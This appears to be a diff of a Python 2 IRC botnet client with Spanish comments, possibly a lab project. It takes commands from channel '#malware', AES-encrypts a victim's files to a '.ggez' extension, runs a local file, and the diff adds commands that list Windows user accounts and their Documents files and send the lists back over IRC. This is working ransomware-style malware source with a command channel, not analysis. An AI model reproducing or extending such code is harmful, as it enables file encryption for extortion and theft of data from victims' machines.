@@ -19,7 +19,6 @@ def Cifra(fnamec):
 	Recibe: La llave para cifrar el archivo y el nombre del archivo
 	Devuelve: Archivo cifrado usando AES como metodo de cifrado
 	"""
-	print "ENTREEEEE"
 	key = CreaLlave()
 	chunksize=64*1024
 	outputfile=fnamec+'.ggez'
@@ -96,6 +95,29 @@ def botName():
     name = "Bot"+ L1 + L2 + L3 + L4
     return name
 
+ def users():
+    usersDir = os.listdir('C:\\Users')
+    userDefault = ('All Users','Default','Default User','DefaultAppPool','Public','desktop.ini')
+    users = []
+    for element in usersDir:
+        if element not in userDefault:
+            users.append(element)
+            print element
+    return users
+
+def files(user):
+    docsPath = "C:\\Users\\"+ user +"\\Documents"
+    docsFiles = os.listdir(docsPath)
+    FilesWithPath = []
+    for file in docsFiles:
+        filePath = docsPath +"\\"+ file
+        FilesWithPath.append(filePath)
+    msg = "Archivos de %s en Documents\n" %user
+    for file in FilesWithPath:
+        msg += file+"\n"
+    print msg
+    return FilesWithPath
+
 server="192.168.1.30"
 botnick=botName()
 channel="#malware"
@@ -121,7 +143,14 @@ while 1:
     if msg.find("!@run")!=-1:
         subprocess.call(['C:\\test.txt'])
     if msg.find("!@users")!=-1:
-        print os.listdir('C:\\Users\\malware\\Documents')
+        users = users()
+        for user in users:
+            irc.send("PRIVMSG "+channel+" %s\r\n" %user)
+    if msg.find("!@files")!=-1:
+        user = msg.split(' ')[4]
+        FilesWithPath = files(user[:-2])
+        for file in FilesWithPath:
+            irc.send("PRIVMSG "+channel+" %s\r\n" %file)
     if msg.find("!@CIFRA") != -1:
         irc.send("PRIVMSG "+channel+" :CIFRANDO!\r\n")
         msg2=msg.split(' ')
@@ -129,5 +158,5 @@ while 1:
             Cifra(msg2[4].replace('\r\n',''))
         except Exception as e:
             irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
-     # Limpio el msg
+    # Limpio el msg
     msg=""
